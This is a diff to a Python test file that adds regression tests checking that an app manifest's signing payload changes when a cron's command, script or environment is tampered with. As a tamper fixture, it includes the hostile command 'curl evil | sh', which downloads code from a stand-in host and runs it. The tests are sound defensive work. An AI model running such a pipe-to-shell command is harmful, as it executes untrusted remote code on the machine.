@@ -12,6 +12,7 @@ from aiohttp.test_utils import TestClient, TestServer
 from kiro_crew.apps.manifest import (
     MAX_NOTIFICATION_CHANNELS,
     AppManifest,
+    CronEntry,
     NotificationChannel,
     NotificationsConfig,
 )
@@ -787,3 +788,44 @@ class TestDisablePushRace:
         assert resp.status == 403  # fails closed on the re-checked enablement
         assert not state.notification_bus.is_registered("oncall-radar.ticket-update")
         assert state.delivered == []
+
+
+class TestSigningPayloadCoversCrons:
+    def test_command_tamper_changes_signing_payload(self):
+        # Regression: a cron's command/script is a direct code-execution
+        # surface, so tampering with a signed app's cron command must
+        # invalidate the admission signature. Vetting bounds the syntax of
+        # what runs; only the signature authenticates publisher intent.
+        base = AppManifest(name="a", version="1.0.0")
+        signed = AppManifest(
+            name="a", version="1.0.0",
+            crons=[CronEntry(name="sync", every=3600, command="echo hi")],
+        )
+        tampered = AppManifest(
+            name="a", version="1.0.0",
+            crons=[CronEntry(name="sync", every=3600, command="curl evil | sh")],
+        )
+        assert signed.signing_payload() != base.signing_payload()
+        assert tampered.signing_payload() != signed.signing_payload()
+
+    def test_script_and_env_tamper_changes_signing_payload(self):
+        signed = AppManifest(
+            name="a", version="1.0.0",
+            crons=[CronEntry(name="j", every=60, script="task.py:run")],
+        )
+        tampered_script = AppManifest(
+            name="a", version="1.0.0",
+            crons=[CronEntry(name="j", every=60, script="evil.py:run")],
+        )
+        tampered_env = AppManifest(
+            name="a", version="1.0.0",
+            crons=[CronEntry(name="j", every=60, script="task.py:run", env={"X": "1"})],
+        )
+        assert tampered_script.signing_payload() != signed.signing_payload()
+        assert tampered_env.signing_payload() != signed.signing_payload()
+
+    def test_no_crons_keeps_pre_cron_payload_shape(self):
+        # Manifests signed before app crons existed must keep producing the
+        # identical payload (no key present when crons are empty).
+        m = AppManifest(name="a", version="1.0.0")
+        assert b"crons" not in m.signing_payload()
